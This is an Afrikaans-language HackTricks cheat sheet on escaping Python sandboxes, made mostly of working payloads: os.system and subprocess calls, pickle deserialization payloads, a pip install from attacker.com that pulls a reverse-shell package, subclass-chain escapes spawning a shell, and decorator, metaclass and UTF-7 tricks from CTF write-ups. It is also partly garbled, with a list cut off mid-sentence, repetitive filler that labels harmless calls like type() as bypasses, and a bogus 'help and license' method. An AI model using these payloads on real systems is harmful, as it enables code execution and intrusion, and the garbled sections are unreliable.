# Omseil Python sandbokse

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Vind kwesbaarhede wat die belangrikste is sodat jy hulle vinniger kan regstel. Intruder volg jou aanvalsoppervlak, voer proaktiewe dreigingsskanderings uit, vind probleme regoor jou hele tegnologie-stapel, van API's tot webtoepassings en wolkstelsels. [**Probeer dit vandag nog gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks).

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

Hier is 'n paar truuks om Python-sandbokse te omseil en willekeurige opdragte uit te voer.

## Opdraguitvoeringsbiblioteke

Die eerste ding wat jy moet weet, is of jy direk kode kan uitvoer met 'n reeds ingevoerde biblioteek, of as jy enige van hierdie biblioteke kan invoer:
```python
os.system("ls")
os.popen("ls").read()
commands.getstatusoutput("ls")
commands.getoutput("ls")
commands.getstatus("file/path")
subprocess.call("ls", shell=True)
subprocess.Popen("ls", shell=True)
pty.spawn("ls")
pty.spawn("/bin/bash")
platform.os.system("ls")
pdb.os.system("ls")

#Import functions to execute commands
importlib.import_module("os").system("ls")
importlib.__import__("os").system("ls")
imp.load_source("os","/usr/lib/python3.8/os.py").system("ls")
imp.os.system("ls")
imp.sys.modules["os"].system("ls")
sys.modules["os"].system("ls")
__import__("os").system("ls")
import os
from os import *

#Other interesting functions
open("/etc/passwd").read()
open('/var/www/html/input', 'w').write('123')

#In Python2.7
execfile('/usr/lib/python2.7/os.py')
system('ls')
```
Onthou dat die _**open**_ en _**read**_ funksies nuttig kan wees om lêers binne die Python-sandbox te lees en om kode te skryf wat jy kan uitvoer om die sandbox te omseil.

{% hint style="danger" %}
Die **Python2 input()** funksie maak dit moontlik om Python-kode uit te voer voordat die program afbreek.
{% endhint %}

Python probeer om biblioteke **eerstens vanuit die huidige gids te laai** (die volgende opdrag sal druk waar Python modules laai): `python3 -c 'import sys; print(sys.path)'`

![](<../../../.gitbook/assets/image (552).png>)

## Omseil pickle-sandbox met die standaard geïnstalleerde Python-pakkette

### Standaard pakkette

Jy kan 'n **lys van vooraf geïnstalleerde** pakkette hier vind: [https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
Let daarop dat jy vanuit 'n pickle die Python-omgewing **arbitrêre biblioteke kan invoer** wat in die stelsel geïnstalleer is.\
Byvoorbeeld, die volgende pickle sal die pip-biblioteek invoer wanneer dit gelaai word:
```python
#Note that here we are importing the pip library so the pickle is created correctly
#however, the victim doesn't even need to have the library installed to execute it
#the library is going to be loaded automatically

import pickle, os, base64, pip
class P(object):
def __reduce__(self):
return (pip.main,(["list"],))

print(base64.b64encode(pickle.dumps(P(), protocol=0)))
```
Vir meer inligting oor hoe pickle werk, kyk hier: [https://checkoway.net/musings/pickle/](https://checkoway.net/musings/pickle/)

### Pip-pakket

Truuk gedeel deur **@isHaacK**

As jy toegang het tot `pip` of `pip.main()`, kan jy 'n willekeurige pakket installeer en 'n omgekeerde skulp oproep deur die volgende te doen:
```bash
pip install http://attacker.com/Rerverse.tar.gz
pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
```
Jy kan die pakkie aflaai om die omgekeerde dop te skep hier. Let asseblief daarop dat voordat jy dit gebruik, jy dit moet **ontpakteer, die `setup.py` verander, en jou IP vir die omgekeerde dop moet plaas**:

{% file src="../../../.gitbook/assets/reverse.tar.gz" %}

{% hint style="info" %}
Hierdie pakkie word "Reverse" genoem. Dit is egter spesiaal ontwerp sodat wanneer jy die omgekeerde dop verlaat, die res van die installasie sal misluk, sodat jy **geen ekstra Python-pakket op die bediener agterlaat** wanneer jy vertrek nie.
{% endhint %}

## Eval van Python-kode

{% hint style="warning" %}
Let daarop dat `exec` meerdere lynstrings en ";", maar `eval` nie toelaat nie (kontroleer walrus-operator)
{% endhint %}

As sekere karakters verbode is, kan jy die **heks-/oktaal-/B64-voorstelling** gebruik om die beperking te **omseil**:
```python
exec("print('RCE'); __import__('os').system('ls')") #Using ";"
exec("print('RCE')\n__import__('os').system('ls')") #Using "\n"
eval("__import__('os').system('ls')") #Eval doesn't allow ";"
eval(compile('print("hello world"); print("heyy")', '<stdin>', 'exec')) #This way eval accept ";"
__import__('timeit').timeit("__import__('os').system('ls')",number=1)
#One liners that allow new lines and tabs
eval(compile('def myFunc():\n\ta="hello word"\n\tprint(a)\nmyFunc()', '<stdin>', 'exec'))
exec(compile('def myFunc():\n\ta="hello word"\n\tprint(a)\nmyFunc()', '<stdin>', 'exec'))
```

```python
#Octal
exec("\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\154\163\47\51")
#Hex
exec("\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x6c\x73\x27\x29")
#Base64
exec('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='.decode("base64")) #Only python2
exec(__import__('base64').b64decode('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='))
```
### Ander biblioteke wat dit moontlik maak om Python-kode te evaluteer

Hier is 'n lys van ander biblioteke wat gebruik kan word om Python-kode te evaluteer, veral in situasies waar 'n sandboksomgewing omseil moet word:

- **`execnet`**: Hierdie biblioteek bied 'n eenvoudige manier om kode in 'n ander Python-proses uit te voer. Dit kan gebruik word om sandbokse te omseil deur die kode in 'n ander proses uit te voer waar geen beperkings geld nie.
- **`pypy-sandbox`**: Hierdie biblioteek is 'n sandboksomgewing wat spesifiek ontwerp is om Python-kode te hardloop. Dit bied 'n veilige omgewing waarin die kode geëvalueer kan word sonder om die hele stelsel te beïnvloed.
- **`PyPy`**: Dit is 'n alternatiewe implementering van Python wat 'n JIT-kompilator gebruik. Dit kan gebruik word om sandbokse te omseil deur die kode in 'n ander Python-omgewing uit te voer wat nie beperkings het nie.
- **`RestrictedPython`**: Hierdie biblioteek bied 'n beperkte uitvoeringsomgewing vir Python-kode. Dit kan gebruik word om sandbokse te omseil deur die kode binne die beperkte omgewing uit te voer.

Dit is belangrik om te onthou dat die gebruik van hierdie biblioteke om sandbokse te omseil, 'n potensiële veiligheidsrisiko kan inhou. Dit moet slegs gedoen word met toestemming en binne die raamwerk van wettige en etiese hacking-aktiwiteite.
```python
#Pandas
import pandas as pd
df = pd.read_csv("currency-rates.csv")
df.query('@__builtins__.__import__("os").system("ls")')
df.query("@pd.io.common.os.popen('ls').read()")
df.query("@pd.read_pickle('http://0.0.0.0:6334/output.exploit')")

# The previous options work but others you might try give the error:
# Only named functions are supported
# Like:
df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']('print(1)')")
```
## Operateurs en kort truuks

Hier is 'n lys van operateurs en kort truuks wat gebruik kan word om Python sandbokse te omseil:

### 1. `__import__`

Die `__import__` funksie kan gebruik word om modules te importeer sonder om die normale importering te gebruik. Dit kan help om beperkings in die sandboks te omseil.

```python
__import__('os').system('command')
```

### 2. `eval`

Die `eval` funksie kan gebruik word om 'n string as 'n Python uitdrukking te evalueer. Dit kan help om beperkings in die sandboks te omseil.

```python
eval("__import__('os').system('command')")
```

### 3. `exec`

Die `exec` funksie kan gebruik word om 'n string as 'n Python program uit te voer. Dit kan help om beperkings in die sandboks te omseil.

```python
exec("__import__('os').system('command')")
```

### 4. `globals`

Die `globals` funksie gee toegang tot die globale namespace van die program. Dit kan gebruik word om beperkings in die sandboks te omseil.

```python
globals()['__builtins__']['__import__']('os').system('command')
```

### 5. `locals`

Die `locals` funksie gee toegang tot die lokale namespace van die program. Dit kan gebruik word om beperkings in die sandboks te omseil.

```python
locals()['__builtins__']['__import__']('os').system('command')
```

### 6. `setattr`

Die `setattr` funksie kan gebruik word om 'n waarde aan 'n eienskap van 'n objek toe te ken. Dit kan help om beperkings in die sandboks te omseil.

```python
setattr(obj, 'property', value)
```

### 7. `getattr`

Die `getattr` funksie kan gebruik word om die waarde van 'n eienskap van 'n objek te kry. Dit kan help om beperkings in die sandboks te omseil.

```python
getattr(obj, 'property')
```

### 8. `type`

Die `type` funksie kan gebruik word om die tipe van 'n objek te bepaal. Dit kan help om beperkings in die sandboks te omseil.

```python
type(obj)
```

### 9. `dir`

Die `dir` funksie gee 'n lys van eienskappe en metodes van 'n objek. Dit kan help om beperkings in die sandboks te omseil.

```python
dir(obj)
```

### 10. `__builtins__`

Die `__builtins__` objek gee toegang tot die ingeboude funksies en modules van Python. Dit kan gebruik word om beperkings in die sandboks te omseil.

```python
__builtins__.__dict__['__import__']('os').system('command')
```

### 11. `__class__`

Die `__class__` eienskap gee toegang tot die klas van 'n objek. Dit kan help om beperkings in die sandboks te omseil.

```python
obj.__class__.__base__.__subclasses__()
```

### 12. `__bases__`

Die `__bases__` eienskap gee toegang tot die basis klasse van 'n klas. Dit kan help om beperkings in die sandboks te omseil.

```python
obj.__class__.__bases__[0].__subclasses__()
```

### 13. `__subclasses__`

Die `__subclasses__` metode gee 'n lys van subklasse van 'n klas. Dit kan help om beperkings in die sandboks te omseil.

```python
obj.__class__.__subclasses__()
```

### 14. `__mro__`

Die `__mro__` eienskap gee 'n lys van die metode resolusie orde van 'n klas. Dit kan help om beperkings in die sandboks te omseil.

```python
obj.__class__.__mro__
```

### 15. `__getattribute__`

Die `__getattribute__` metode kan gebruik word om die waarde van 'n eienskap van 'n objek te kry. Dit kan help om beperkings in die sandboks te omseil.

```python
obj.__getattribute__('property')
```

### 16. `__setattr__`

Die `__setattr__` metode kan gebruik word om 'n waarde aan 'n eienskap van 'n objek toe te ken. Dit kan help om beperkings in die sandboks te omseil.

```python
obj.__setattr__('property', value)
```

### 17. `__delattr__`

Die `__delattr__` metode kan gebruik word om 'n eienskap van 'n objek te verwyder. Dit kan help om beperkings in die sandboks te omseil.

```python
obj.__delattr__('property')
```

### 18. `__call__`

Die `__call__` metode kan gebruik word om 'n objek as 'n funksie te roep. Dit kan help om beperkings in die sandboks te omseil.

```python
obj.__call__('argument')
```

### 19. `__init__`

Die `__init__` metode word opgeroep wanneer 'n nuwe instansie van 'n klas geskep word. Dit kan help om beperkings in die sandboks te omseil.

```python
obj.__init__('argument')
```

### 20. `__new__`

Die `__new__` metode word opgeroep om 'n nuwe instansie van 'n klas te skep. Dit kan help om beperkings in die sandboks te omseil.

```python
obj.__new__('argument')
```

### 21. `__class__.__name__`

Die `__class__.__name__` eienskap gee die naam van die klas van 'n objek. Dit kan help om beperkings in die sandboks te omseil.

```python
obj.__class__.__name__
```

### 22. `__class__.__bases__[0].__subclasses__()[index]`

Die `__class__.__bases__[0].__subclasses__()[index]` uitdrukking gee toegang tot 'n spesifieke subklas van 'n klas. Dit kan help om beperkings in die sandboks te omseil.

```python
obj.__class__.__bases__[0].__subclasses__()[index]
```

### 23. `__class__.__base__.__subclasses__()[index]`

Die `__class__.__base__.__subclasses__()[index]` uitdrukking gee toegang tot 'n spesifieke subklas van 'n klas. Dit kan help om beperkings in die sandboks te omseil.

```python
obj.__class__.__base__.__subclasses__()[index]
```

### 24. `__class__.__base__.__subclasses__()[index].__init__`

Die `__class__.__base__.__subclasses__()[index].__init__` uitdrukking gee toegang tot die `__init__` metode van 'n spesifieke subklas van 'n klas. Dit kan help om beperkings in die sandboks te omseil.

```python
obj.__class__.__base__.__subclasses__()[index].__init__
```

### 25. `__class__.__base__.__subclasses__()[index].__init__.__globals__`

Die `__class__.__base__.__subclasses__()[index].__init__.__globals__` uitdrukking gee toegang tot die globale namespace van die `__init__` metode van 'n spesifieke subklas van 'n klas. Dit kan help om beperkings in die sandboks te omseil.

```python
obj.__class__.__base__.__subclasses__()[index].__init__.__globals__
```

### 26. `__class__.__base__.__subclasses__()[index].__init__.__globals__['os'].system('command')`

Die `__class__.__base__.__subclasses__()[index].__init__.__globals__['os'].system('command')` uitdrukking gee toegang tot die `os.system` funksie van die globale namespace van die `__init__` metode van 'n spesifieke subklas van 'n klas. Dit kan help om beperkings in die sandboks te omseil.

```python
obj.__class__.__base__.__subclasses__()[index].__init__.__globals__['os'].system('command')
```

### 27. `__class__.__base__.__subclasses__()[index].__init__.__globals__['__builtins__']['__import__']('os').system('command')`

Die `__class__.__base__.__subclasses__()[index].__init__.__globals__['__builtins__']['__import__']('os').system('command')` uitdrukking gee toegang tot die `__import__` funksie van die `__builtins__` objek in die globale namespace van die `__init__` metode van 'n spesifieke subklas van 'n klas. Dit kan help om beperkings in die sandboks te omseil.

```python
obj.__class__.__base__.__subclasses__()[index].__init__.__globals__['__builtins__']['__import__']('os').system('command')
```

### 28. `__class__.__base__.__subclasses__()[index].__init__.__globals__['__builtins__']['eval']("__import__('os').system('command')")`

Die `__class__.__base__.__subclasses__()[index].__init__.__globals__['__builtins__']['eval']("__import__('os').system('command')")` uitdrukking gee toegang tot die `eval` funksie van die `__builtins__` objek in die globale namespace van die `__init__` metode van 'n spesifieke subklas van 'n klas. Dit kan help om beperkings in die sandboks te omseil.

```python
obj.__class__.__base__.__subclasses__()[index].__init__.__globals__['__builtins__']['eval']("__import__('os').system('command')")
```

### 29. `__class__.__base__.__subclasses__()[index].__init__.__globals__['__builtins__']['exec']("__import__('os').system('command')")`

Die `__class__.__base__.__subclasses__()[index].__init__.__globals__['__builtins__']['exec']("__import__('os').system('command')")` uitdrukking gee toegang tot die `exec` funksie van die `__builtins__` objek in die globale namespace van die `__init__` metode van 'n spesifieke subklas van 'n klas. Dit kan help om beperkings in die sandboks te omseil.

```python
obj.__class__.__base__.__subclasses__()[index].__init__.__globals__['__builtins__']['exec']("__import__('os').system('command')")
```

### 30. `__class__.__base__.__subclasses__()[index].__init__.__globals__['__builtins__']['globals']()['__builtins__']['__import__']('os').system('command')`

Die `__class__.__base__.__subclasses__()[index].__init__.__globals__['__builtins__']['globals']()['__builtins__']['__import__']('os').system('command')` uitdrukking gee toegang tot die `globals` funksie van die `__builtins__` objek in die globale namespace van die `__init__` metode van 'n spesifieke subklas van 'n klas. Dit kan help om beperkings in die sandboks te omseil.

```python
obj.__class__.__base__.__subclasses__()[index].__init__.__globals__['__builtins__']['globals']()['__builtins__']['__import__']('os').system('command')
```

### 31. `__class__.__base__.__subclasses__()[index].__init__.__globals__['__builtins__']['locals']()['__builtins__']['__import__']('os').system('command')`

Die `__class__.__base__.__subclasses__()[index].__init__.__globals__['__builtins__']['locals']()['__builtins__']['__import__']('os').system('command')` uitdrukking gee toegang tot die `locals` funksie van die `__builtins__` objek in die globale namespace van die `__init__` metode van 'n spesifieke subklas van 'n klas. Dit kan help om beperkings in die sandboks te omseil.

```python
obj.__class__.__base__.__subclasses__()[index].__init__.__globals__['__builtins__']['locals']()['__builtins__']['__import__']('os').system('command')
```

### 32. `__class__.__base__.__subclasses__()[index].__init__.__globals__['__builtins__']['setattr'](obj, 'property', value)`

Die `__class__.__base__.__subclasses__()[index].__init__.__globals__['__builtins__']['setattr'](obj, 'property', value)` uitdrukking gee toegang tot die `setattr` funksie van die `__builtins__` objek in die globale namespace van die `__init__` metode van 'n spesifieke subklas van 'n klas. Dit kan help om beperkings in die sandboks te omseil.

```python
obj.__class__.__base__.__subclasses__()[index].__init__.__globals__['__builtins__']['setattr'](obj, 'property', value)
```

### 33. `__class__.__base__.__subclasses__()[index].__init__.__globals__['__builtins__']['getattr'](obj, 'property')`

Die `__class__.__base__.__subclasses__()[index].__init__.__globals__['__builtins__']['getattr'](obj, 'property')` uitdrukking gee toegang tot die `getattr` funksie van die `__builtins__` objek in die globale namespace van die `__init__` metode van 'n spesifieke subklas van 'n klas. Dit kan help om beperkings in die sandboks te omseil.

```python
obj.__class__.__base__.__subclasses__()[index].__init__.__globals__['__builtins__']['getattr'](obj, 'property')
```

### 34. `__class__.__base__.__subclasses__()[index].__init__.__globals__['__builtins__']['type'](obj)`

Die `__class__.__base__.__subclasses__()[index].__init__.__globals__['__builtins__']['type'](obj)` uitdrukking gee toegang tot die `type` funksie van die `__builtins__` objek in die globale namespace van die `__init__` metode van 'n spesifieke subklas van 'n klas. Dit kan help om beperkings in die sandboks te omseil.

```python
obj.__class__.__base__.__subclasses__()[index].__init__.__globals__['__builtins__']['type'](obj)
```

### 35. `__class__.__base__.__subclasses__()[index].__init__.__globals__['__builtins__']['dir'](obj)`

Die `__class__.__base__.__subclasses__()[index].__init__.__globals__['__builtins__']['dir'](obj)` uitdrukking gee toegang tot die `dir` funksie van die `__builtins__` objek in die globale namespace van die `__init__` metode van 'n spesifieke subklas van 'n klas. Dit kan help om beperkings in die sandboks te omseil.

```python
obj.__class__.__base__.__subclasses__()[index].__init__.__globals__['__builtins__']['dir'](obj)
```

### 36. `__class__.__base__.__subclasses__()[index].__init__.__globals__['__builtins__']['__import__']('os').system('command')`

Die `__class__.__base__.__subclasses__()[index].__init__.__globals__['__builtins__']['__import__']('os').system('command')` uitdrukking gee toegang tot die `__import__` funksie van die `__builtins__` objek in die globale namespace van die `__init__` metode van 'n spesifieke subklas van 'n klas. Dit kan help om beperkings in die sandboks te omseil.

```python
obj.__class__.__base__.__subclasses__()[index].__init__.__globals__['__builtins__']['__import__']('os').system('command')
```

### 37. `__class__.__base__.__subclasses__()[index].__init__.__globals__['__builtins__']['__class__']`

Die `__class__.__base__.__subclasses__()[index].__init__.__globals__['__builtins__']['__class__']` uitdrukking gee toegang tot die `__class__` eienskap van die `
```python
# walrus operator allows generating variable inside a list
## everything will be executed in order
## From https://ur4ndom.dev/posts/2020-06-29-0ctf-quals-pyaucalc/
[a:=21,a*2]
[y:=().__class__.__base__.__subclasses__()[84]().load_module('builtins'),y.__import__('signal').alarm(0), y.exec("import\x20os,sys\nclass\x20X:\n\tdef\x20__del__(self):os.system('/bin/sh')\n\nsys.modules['pwnd']=X()\nsys.exit()", {"__builtins__":y.__dict__})]
## This is very useful for code injected inside "eval" as it doesn't support multiple lines or ";"
```
## Om beskerming te omseil deur kodering (UTF-7)

In [**hierdie uiteensetting**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy) word UTF-7 gebruik om willekeurige Python-kode te laai en uit te voer binne 'n skynbare sandkas:
```python
assert b"+AAo-".decode("utf_7") == "\n"

payload = """
# -*- coding: utf_7 -*-
def f(x):
return x
#+AAo-print(open("/flag.txt").read())
""".lstrip()
```
Dit is ook moontlik om dit te omseil deur ander enkoderings te gebruik, byvoorbeeld `raw_unicode_escape` en `unicode_escape`.

## Python-uitvoering sonder oproepe

As jy binne 'n Python-gevangenis is wat **nie toelaat dat jy oproepe maak nie**, is daar steeds maniere om **arbitrêre funksies, kode** en **opdragte** uit te voer.

### RCE met [decorators](https://docs.python.org/3/glossary.html#term-decorator)
```python
# From https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/
@exec
@input
class X:
pass

# The previous code is equivalent to:
class X:
pass
X = input(X)
X = exec(X)

# So just send your python code when prompted and it will be executed


# Another approach without calling input:
@eval
@'__import__("os").system("sh")'.format
class _:pass
```
### RCE skep van voorwerpe en oorlading

As jy 'n klas kan **verklaar** en 'n voorwerp van daardie klas kan **skep**, kan jy **verskillende metodes skryf/herskryf** wat **geaktiveer** kan word **sonder** om hulle direk te roep.

#### RCE met aangepaste klasse

Jy kan sommige **klasmetodes** wysig (_deur bestaande klasmetodes te herskryf of 'n nuwe klas te skep_) om hulle **arbitrêre kode** te laat **uitvoer** wanneer hulle **geaktiveer** word sonder om hulle direk te roep.
```python
# This class has 3 different ways to trigger RCE without directly calling any function
class RCE:
def __init__(self):
self += "print('Hello from __init__ + __iadd__')"
__iadd__ = exec #Triggered when object is created
def __del__(self):
self -= "print('Hello from __del__ + __isub__')"
__isub__ = exec #Triggered when object is created
__getitem__ = exec #Trigerred with obj[<argument>]
__add__ = exec #Triggered with obj + <argument>

# These lines abuse directly the previous class to get RCE
rce = RCE() #Later we will see how to create objects without calling the constructor
rce["print('Hello from __getitem__')"]
rce + "print('Hello from __add__')"
del rce

# These lines will get RCE when the program is over (exit)
sys.modules["pwnd"] = RCE()
exit()

# Other functions to overwrite
__sub__ (k - 'import os; os.system("sh")')
__mul__ (k * 'import os; os.system("sh")')
__floordiv__ (k // 'import os; os.system("sh")')
__truediv__ (k / 'import os; os.system("sh")')
__mod__ (k % 'import os; os.system("sh")')
__pow__ (k**'import os; os.system("sh")')
__lt__ (k < 'import os; os.system("sh")')
__le__ (k <= 'import os; os.system("sh")')
__eq__ (k == 'import os; os.system("sh")')
__ne__ (k != 'import os; os.system("sh")')
__ge__ (k >= 'import os; os.system("sh")')
__gt__ (k > 'import os; os.system("sh")')
__iadd__ (k += 'import os; os.system("sh")')
__isub__ (k -= 'import os; os.system("sh")')
__imul__ (k *= 'import os; os.system("sh")')
__ifloordiv__ (k //= 'import os; os.system("sh")')
__idiv__ (k /= 'import os; os.system("sh")')
__itruediv__ (k /= 'import os; os.system("sh")') (Note that this only works when from __future__ import division is in effect.)
__imod__ (k %= 'import os; os.system("sh")')
__ipow__ (k **= 'import os; os.system("sh")')
__ilshift__ (k<<= 'import os; os.system("sh")')
__irshift__ (k >>= 'import os; os.system("sh")')
__iand__ (k = 'import os; os.system("sh")')
__ior__ (k |= 'import os; os.system("sh")')
__ixor__ (k ^= 'import os; os.system("sh")')
```
#### Skep voorwerpe met [metaklasse](https://docs.python.org/3/reference/datamodel.html#metaclasses)

Die sleutel ding wat metaklasse ons toelaat om te doen is **'n instansie van 'n klas maak sonder om die konstrukteur direk te roep**, deur 'n nuwe klas met die teiken klas as 'n metaklas te skep.
```python
# Code from https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/ and fixed
# This will define the members of the "subclass"
class Metaclass(type):
__getitem__ = exec # So Sub[string] will execute exec(string)
# Note: Metaclass.__class__ == type

class Sub(metaclass=Metaclass): # That's how we make Sub.__class__ == Metaclass
pass # Nothing special to do

Sub['import os; os.system("sh")']

## You can also use the tricks from the previous section to get RCE with this object
```
#### Skep van voorwerpe met uitsonderings

Wanneer 'n **uitsondering geaktiveer** word, word 'n voorwerp van die **Uitsondering** **geskep** sonder dat jy die konstrukteur direk hoef te roep ( 'n truuk van [**@\_nag0mez**](https://mobile.twitter.com/\_nag0mez)):
```python
class RCE(Exception):
def __init__(self):
self += 'import os; os.system("sh")'
__iadd__ = exec #Triggered when object is created
raise RCE #Generate RCE object


# RCE with __add__ overloading and try/except + raise generated object
class Klecko(Exception):
__add__ = exec

try:
raise Klecko
except Klecko as k:
k + 'import os; os.system("sh")' #RCE abusing __add__

## You can also use the tricks from the previous section to get RCE with this object
```
### Meer RCE

In addition to the previously mentioned techniques, there are several other methods that can be used to achieve Remote Code Execution (RCE) in Python sandboxes. These techniques exploit different vulnerabilities and weaknesses in the sandbox environment to execute arbitrary code.

#### 1. Exploiting Python's `eval()` function

The `eval()` function in Python can be used to execute arbitrary code. By injecting malicious code into the `eval()` function, it is possible to bypass the sandbox and achieve RCE. This can be done by manipulating the input to the `eval()` function and providing code that will be executed.

#### 2. Leveraging Python's `exec()` function

Similar to the `eval()` function, the `exec()` function in Python can also be used to execute arbitrary code. By carefully crafting the input to the `exec()` function, it is possible to bypass the sandbox and achieve RCE. This technique is particularly effective when combined with other sandbox bypass methods.

#### 3. Exploiting deserialization vulnerabilities

Python's pickle module is used for object serialization and deserialization. Deserialization vulnerabilities can be exploited to achieve RCE in Python sandboxes. By manipulating the serialized data and injecting malicious code, it is possible to execute arbitrary code within the sandbox environment.

#### 4. Abusing dynamic code execution

Python allows dynamic code execution through the use of functions like `exec()`, `eval()`, and `compile()`. By leveraging these functions, it is possible to execute arbitrary code within the sandbox environment. This technique can be combined with other sandbox bypass methods to achieve RCE.

#### 5. Exploiting insecure file operations

Insecure file operations, such as reading or writing files without proper validation, can be exploited to achieve RCE in Python sandboxes. By manipulating file paths or contents, it is possible to execute arbitrary code within the sandbox environment.

#### 6. Leveraging third-party libraries

Python relies heavily on third-party libraries, which may contain vulnerabilities that can be exploited to achieve RCE. By identifying and exploiting vulnerabilities in these libraries, it is possible to bypass the sandbox and execute arbitrary code.

It is important to note that these techniques should only be used for ethical purposes, such as penetration testing or security research. Unauthorized use of these techniques is illegal and can result in severe consequences.
```python
# From https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/
# If sys is imported, you can sys.excepthook and trigger it by triggering an error
class X:
def __init__(self, a, b, c):
self += "os.system('sh')"
__iadd__ = exec
sys.excepthook = X
1/0 #Trigger it

# From https://github.com/google/google-ctf/blob/master/2022/sandbox-treebox/healthcheck/solution.py
# The interpreter will try to import an apt-specific module to potentially
# report an error in ubuntu-provided modules.
# Therefore the __import__ functions are overwritten with our RCE
class X():
def __init__(self, a, b, c, d, e):
self += "print(open('flag').read())"
__iadd__ = eval
__builtins__.__import__ = X
{}[1337]
```
### Lees lêer met behulp van builtins help & lisensie

Hier is 'n eenvoudige metode om 'n lêer te lees deur die gebruik van die `builtins` module se `help` en `license` funksies in Python.

```python
import builtins

def read_file(file_path):
    with open(file_path, 'r') as file:
        file_contents = file.read()
        return file_contents

def bypass_sandbox(file_path):
    help(builtins)
    license()
    return read_file(file_path)
```

Hier is hoe jy die funksie kan gebruik:

```python
file_path = '/path/to/file.txt'
bypass_sandbox(file_path)
```

Hierdie metode maak gebruik van die `help` funksie om die `builtins` module se dokumentasie te druk. Dit kan help om 'n oorsig te kry van die beskikbare funksies en klasse in die `builtins` module. Die `license` funksie druk die lisensie-inligting van Python. Hierdie stappe kan help om die aandag van die sandboks te verdeel en die uitvoering van die `read_file` funksie moontlik te maak.

Dit is belangrik om te onthou dat die omseiling van sandbokse 'n potensiële veiligheidsrisiko kan wees en slegs in toepaslike omstandighede gebruik moet word.
```python
__builtins__.__dict__["license"]._Printer__filenames=["flag"]
a = __builtins__.help
a.__class__.__enter__ = __builtins__.__dict__["license"]
a.__class__.__exit__ = lambda self, *args: None
with (a as b):
pass
```
<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Vind kwesbaarhede wat die belangrikste is sodat jy dit vinniger kan regmaak. Intruder volg jou aanvalsoppervlak, voer proaktiewe dreigingsskanderings uit, vind probleme regoor jou hele tegnologie-stapel, van API's tot webtoepassings en wolkstelsels. [**Probeer dit vandag nog gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks).

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Ingeboude funksies

* [**Ingeboude funksies van python2**](https://docs.python.org/2/library/functions.html)
* [**Ingeboude funksies van python3**](https://docs.python.org/3/library/functions.html)

As jy toegang het tot die **`__builtins__`** objek, kan jy biblioteke invoer (let daarop dat jy ook ander string-voorstelling hier kan gebruik wat in die laaste afdeling gewys word):
```python
__builtins__.__import__("os").system("ls")
__builtins__.__dict__['__import__']("os").system("ls")
```
### Geen Ingebouwde Functies

Wanneer jy nie `__builtins__` het nie, sal jy nie in staat wees om enigiets in te voer nie, of selfs lêes of skryf na lêers nie, omdat **alle globale funksies** (soos `open`, `import`, `print`...) **nie gelaai word nie**.\
Nietemin, **standaard importeer Python baie modules in die geheue**. Hierdie modules mag onskadelik lyk, maar sommige van hulle **importe ook gevaarlike funksionaliteite** binne-in hulle wat toeganklik is om selfs **arbitrêre kode-uitvoering** te verkry.

In die volgende voorbeelde kan jy sien hoe om van hierdie "**onskadelike**" modules wat gelaai is, **misbruik** te maak om toegang te verkry tot **gevaarlike funksionaliteite** binne-in hulle.

**Python2**
```python
#Try to reload __builtins__
reload(__builtins__)
import __builtin__

# Read recovering <type 'file'> in offset 40
().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()
# Write recovering <type 'file'> in offset 40
().__class__.__bases__[0].__subclasses__()[40]('/var/www/html/input', 'w').write('123')

# Execute recovering __import__ (class 59s is <class 'warnings.catch_warnings'>)
().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']('os').system('ls')
# Execute (another method)
().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__("func_globals")['linecache'].__dict__['os'].__dict__['system']('ls')
# Execute recovering eval symbol (class 59 is <class 'warnings.catch_warnings'>)
().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]["eval"]("__import__('os').system('ls')")

# Or you could obtain the builtins from a defined function
get_flag.__globals__['__builtins__']['__import__']("os").system("ls")
```
#### Python3

Python3 is 'n kragtige en veelsydige programmeertaal wat algemeen gebruik word vir die ontwikkeling van sagteware, webtoepassings en data-analise. Dit bied 'n groot verskeidenheid biblioteke en raamwerke wat die ontwikkelingsproses vergemaklik.

